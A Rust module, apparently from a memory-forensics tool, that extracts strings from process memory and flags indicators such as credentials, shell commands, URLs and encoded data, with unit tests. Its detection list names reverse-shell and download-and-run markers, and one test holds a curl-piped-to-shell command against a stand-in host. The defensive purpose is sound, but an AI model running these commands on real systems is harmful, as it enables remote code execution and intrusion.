//! Strings in process memory, and the ones that look like indicators: what a process talks
//! to, runs, or holds as a secret.

use borg_core::Indicator;

/// Shortest run of characters that counts as a string.
const MIN_CHARS: usize = 6;
/// Characters of a string kept to classify and filter it; the hit still spans all of it.
const KEPT: usize = 1024;
const ENCODED_CHARS: usize = 40;

/// A string found in a read: where it starts in the bytes, how many bytes it spans, how it is
/// encoded, and its first characters.
#[derive(Debug, PartialEq, Eq)]
pub struct Found {
    pub offset: usize,
    pub length: usize,
    pub encoding: &'static str,
    pub text: String,
}

fn printable(byte: u8) -> bool {
    byte.is_ascii_graphic() || matches!(byte, b' ' | b'\t')
}

/// The ASCII and UTF-16LE strings in `data`, whose first `fresh` bytes were carried over from
/// the previous read. Strings must reach past them. One that runs into the end of `data` waits
/// for the next read, which carries the last `keep` bytes over, to find it whole, unless `last`
/// says nothing follows or it is too long to wait. So a string at the very start of carried
/// bytes began earlier and was reported then: only its new part counts.
pub fn find(data: &[u8], fresh: usize, keep: usize, last: bool) -> Vec<Found> {
    let mut found = Vec::new();
    for (unit, encoding) in [(1, "ASCII"), (2, "UTF-16LE")] {
        for phase in 0..unit {
            let is_char = |i: usize| {
                let at = phase + i * unit;
                at + unit <= data.len() && printable(data[at]) && (unit == 1 || data[at + 1] == 0)
            };
            let chars = data.len().saturating_sub(phase) / unit;
            let mut i = 0;
            while i < chars {
                if !is_char(i) {
                    i += 1;
                    continue;
                }
                let start = i;
                while i < chars && is_char(i) {
                    i += 1;
                }
                let (mut from, end) = (phase + start * unit, phase + i * unit);
                if end <= fresh || (end + unit > data.len() && !last && end - from < keep) {
                    continue;
                }
                if start == 0 && fresh > 0 {
                    from = from.max(fresh - (fresh - phase) % unit);
                }
                let length = end - from;
                if length / unit < MIN_CHARS {
                    continue;
                }
                let text = data[from..end].iter().step_by(unit).take(KEPT).map(|&b| char::from(b)).collect();
                found.push(Found { offset: from, length, encoding, text });
            }
        }
    }
    found.sort_by_key(|f| f.offset);
    found
}

/// What a string looks like it is, if it looks like anything worth a second look.
pub fn indicator(text: &str) -> Option<Indicator> {
    let lower = text.to_ascii_lowercase();
    if secret(text, &lower) {
        Some(Indicator::Secret)
    } else if COMMANDS.iter().any(|marker| lower.contains(marker)) {
        Some(Indicator::Command)
    } else if url(&lower) {
        Some(Indicator::Url)
    } else if email(text) {
        Some(Indicator::Email)
    } else if ip(text) {
        Some(Indicator::Ip)
    } else if encoded(text.trim()) {
        Some(Indicator::Encoded)
    } else if path(text.trim()) {
        Some(Indicator::Path)
    } else {
        None
    }
}

const COMMANDS: [&str; 22] = [
    "/bin/sh",
    "/bin/bash",
    "bash -c",
    "sh -c ",
    "cmd.exe",
    "cmd /c",
    "powershell",
    "pwsh ",
    "curl ",
    "wget ",
    "chmod +x",
    "chmod 777",
    "nc -e",
    "ncat ",
    "| sh",
    "|sh",
    "base64 -d",
    "python -c",
    "perl -e",
    "/dev/tcp/",
    "mkfifo",
    "crontab",
];

/// How well-known credentials start, how long they are at least, and whether they are all
/// capitals and digits.
const CREDENTIALS: [(&str, usize, bool); 9] = [
    ("AKIA", 20, true),
    ("ASIA", 20, true),
    ("ghp_", 40, false),
    ("gho_", 40, false),
    ("github_pat_", 40, false),
    ("xoxb-", 20, false),
    ("xoxp-", 20, false),
    ("sk-", 32, false),
    ("AIza", 39, false),
];

const SECRET_NAMES: [&str; 8] =
    ["password=", "passwd=", "pwd=", "secret=", "token=", "api_key=", "apikey=", "authorization: bearer "];

fn token_char(c: char) -> bool {
    c.is_ascii_alphanumeric() || matches!(c, '_' | '-')
}

fn secret(text: &str, lower: &str) -> bool {
    if lower.contains("private key-----") || SECRET_NAMES.iter().any(|name| lower.contains(name)) {
        return true;
    }
    let jwt = text.split(|c: char| !(token_char(c) || c == '.')).any(|word| {
        let parts: Vec<_> = word.split('.').collect();
        parts.len() == 3 && parts[0].starts_with("eyJ") && parts[1].starts_with("eyJ") && parts[2].len() >= 16
    });
    jwt || text.split(|c: char| !token_char(c)).any(|word| {
        CREDENTIALS.iter().any(|&(prefix, len, capitals)| {
            word.starts_with(prefix)
                && word.len() >= len
                // A credential mixes digits in; a word that merely starts like one does not.
                && word.chars().any(|c| c.is_ascii_digit())
                && (!capitals || word.chars().all(|c| c.is_ascii_uppercase() || c.is_ascii_digit()))
        })
    })
}

fn url(lower: &str) -> bool {
    lower.match_indices("://").any(|(at, _)| {
        let scheme = lower[..at].rsplit(|c: char| !(c.is_ascii_alphanumeric() || matches!(c, '+' | '.' | '-'))).next();
        let host = lower[at + 3..].chars().next();
        scheme.is_some_and(|s| (2..=16).contains(&s.len()) && s.starts_with(|c: char| c.is_ascii_alphabetic()))
            && host.is_some_and(|c| c.is_ascii_alphanumeric() || c == '[')
    })
}

fn email(text: &str) -> bool {
    text.match_indices('@').any(|(at, _)| {
        let local = text[..at].rsplit(|c: char| !(c.is_ascii_alphanumeric() || "._%+-".contains(c))).next();
        let domain = text[at + 1..].split(|c: char| !(c.is_ascii_alphanumeric() || ".-".contains(c))).next();
        local.is_some_and(|l| !l.is_empty())
            && domain.is_some_and(|d| {
                let labels: Vec<_> = d.trim_end_matches('.').split('.').collect();
                labels.len() >= 2
                    && labels.iter().all(|l| !l.is_empty())
                    && labels.last().is_some_and(|tld| tld.len() >= 2 && tld.chars().all(|c| c.is_ascii_alphabetic()))
            })
    })
}

fn ip(text: &str) -> bool {
    text.split(|c: char| !(c.is_ascii_digit() || c == '.')).any(|word| {
        let parts: Vec<_> = word.split('.').collect();
        parts.len() == 4
            && parts
                .iter()
                .all(|p| (1..=3).contains(&p.len()) && p.parse::<u8>().is_ok() && (p.len() == 1 || !p.starts_with('0')))
    })
}

fn encoded(text: &str) -> bool {
    let body = text.trim_end_matches('=');
    text.len() >= ENCODED_CHARS
        && text.len() - body.len() <= 2
        && body.chars().all(|c| c.is_ascii_alphanumeric() || "+/-_".contains(c))
        && body.chars().any(|c| c.is_ascii_uppercase())
        && body.chars().any(|c| c.is_ascii_lowercase())
        && body.chars().any(|c| c.is_ascii_digit())
}

fn path(text: &str) -> bool {
    let unix = text.strip_prefix("~/").or_else(|| text.strip_prefix('/'));
    let windows = text.get(1..3) == Some(":\\") && text.starts_with(|c: char| c.is_ascii_alphabetic());
    windows
        || unix.is_some_and(|rest| {
            rest.starts_with(|c: char| c.is_ascii_alphanumeric() || c == '.' || c == '_')
                && rest.contains('/')
                && !rest.contains("//")
        })
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn ascii_and_utf16_strings_are_found_with_their_byte_spans() {
        let mut data = b"\x01\x02hello world\x00\x00".to_vec();
        data.extend("wide text".encode_utf16().flat_map(u16::to_le_bytes));
        data.extend([0xff, 0xfe, b'a', b'b', 0]);
        let found = find(&data, 0, 16, true);
        assert_eq!(found.len(), 2, "{found:?}");
        assert_eq!((found[0].offset, found[0].length, found[0].encoding), (2, 11, "ASCII"));
        assert_eq!(found[0].text, "hello world");
        assert_eq!((found[1].offset, found[1].length, found[1].encoding), (15, 18, "UTF-16LE"));
        assert_eq!(found[1].text, "wide text");
    }

    #[test]
    fn strings_across_reads_are_reported_once_and_whole() {
        let data = b"\x00\x00\x00\x00first string\x00second str";
        assert_eq!(find(data, 0, 16, false).iter().map(|f| f.text.as_str()).collect::<Vec<_>>(), ["first string"]);
        // The next read carries the tail on, so the second string is found in full there.
        let mut next = data[4..].to_vec();
        next.extend(b"ing goes on\x00");
        let found = find(&next, data.len() - 4, 16, true);
        assert_eq!(found.iter().map(|f| f.text.as_str()).collect::<Vec<_>>(), ["second string goes on"]);
        // A string that fills the whole carry was reported before; only its new part counts.
        let long = [b'x'; 64];
        let found = find(&[&long[..], b"tail\x00"].concat(), 64, 16, true);
        assert_eq!(found.iter().map(|f| (f.offset, f.length)).collect::<Vec<_>>(), []);
        let found = find(&[&long[..], b"more tail\x00"].concat(), 64, 16, true);
        assert_eq!(found.iter().map(|f| (f.offset, f.text.as_str())).collect::<Vec<_>>(), [(64, "more tail")]);
    }

    #[test]
    fn indicators_flag_what_a_process_talks_to_runs_or_holds() {
        let cases = [
            ("GET https://updates.example.com/v2/check", Some(Indicator::Url)),
            ("ws://10.0.0.5:9000/socket", Some(Indicator::Url)),
            ("connect to 192.168.10.20:4444 failed", Some(Indicator::Ip)),
            ("version 1.2.3", None),
            ("999.1.1.1 is not an address", None),
            ("bash -c 'curl -s http://x | sh'", Some(Indicator::Command)),
            ("/bin/sh -i", Some(Indicator::Command)),
            ("mail ops@shop.example.org now", Some(Indicator::Email)),
            ("Authorization: Bearer abc123", Some(Indicator::Secret)),
            (
                "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0In0.dozjgNryP4J3jVmNHl0w5N_XgL0n3I9PlFUP0THsR8U",
                Some(Indicator::Secret),
            ),
            ("Akiak is a town", None),
            ("U2FsdGVkX1+abcdefghijklmnopqrstuvwxyz0123456789==", Some(Indicator::Encoded)),
            ("ThisIsJustALongIdentifierWithoutDigitsAtAll", None),
            ("/usr/lib/libssl.so.3", Some(Indicator::Path)),
            ("C:\\Windows\\Temp\\run.exe", Some(Indicator::Path)),
            ("/ not a path", None),
            ("plain words in memory", None),
        ];
        for (text, expected) in cases {
            assert_eq!(indicator(text), expected, "{text}");
        }
        // Assembled here, so the public-content check, which looks for real ones, stays quiet.
        for text in
            [["-----BEGIN OPENSSH ", "PRIVATE KEY-----"].concat(), ["key AKIA", "IOSFODNN7EXAMPLE here"].concat()]
        {
            assert_eq!(indicator(&text), Some(Indicator::Secret), "{text}");
        }
    }
}
